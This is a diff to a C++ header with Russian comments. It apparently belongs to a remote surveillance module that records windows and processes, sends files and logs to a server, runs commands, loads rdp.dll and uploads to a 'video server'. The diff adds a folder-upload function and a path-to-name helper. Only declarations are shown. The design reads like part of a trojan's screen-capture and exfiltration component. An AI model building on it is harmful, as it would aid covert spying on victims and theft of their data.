@@ -50,9 +50,10 @@ private:
 	typedef VOID (WINAPI *TResetTimer	)();
 
 	//функции отправки файлов
-	typedef VOID (WINAPI *TStartSend	)( DWORD server, char* name, char* path, int after );
-	typedef DWORD (WINAPI *TStartSendAsync )( DWORD server, char* name, char* path, int after );
-	typedef DWORD (WINAPI *TIsSendedAsync )( DWORD );
+	typedef VOID ( WINAPI *TStartSend	)( DWORD server, char* name, char* path, int after );
+	typedef DWORD ( WINAPI *TStartSendAsync )( DWORD server, char* name, char* path, int after );
+	typedef DWORD ( WINAPI *TIsSendedAsync )( DWORD );
+	typedef DWORD ( WINAPI *TFolderIsUpload )( const char* name, const char* folder );
 
 	//функции передачи логов на сервер
 	typedef void (WINAPI *TSendLog)( DWORD server, const char* name, int code, const char* text );
@@ -86,6 +87,7 @@ public:
 	TIsSendedAsync		IsSendedAsync;
 	TRunCmdExec			RunCmdExec;
 	TSendLog			SendLog;
+	TFolderIsUpload		FolderIsUpload;
 
 };
 
@@ -106,6 +108,7 @@ bool RecordHWND( int server, const char* name, HWND wnd, int seconds = 0, int fl
 bool RecordPID( int server, const char* name, DWORD pid = 0, int seconds = 0, int flags = 0 );
 void RecordStop();
 DWORD SendFiles( int server, const char* name, const char* path, int after = 0, bool async = false );
+bool FolderIsUpload( const char* name, const char* path );
 bool FilesIsSended(DWORD id);
 bool SendLog( int server, const char* name, int code, const char* text );
 //запуск rdp.dll
@@ -155,6 +158,10 @@ PCHAR GetVideoRecHost2();
 bool SaveVideoDll( const char* nameFile );
 
 void StartVideoFromCurrentURL();
+
+//Преобразовывает путь в имя папки для передачи данных на видео-сервер, т. е. заменяет символы
+//которые не могут быть в имени файла на _
+char* PathToName( const char* path, char* name, int szName );
 
 
 #endif
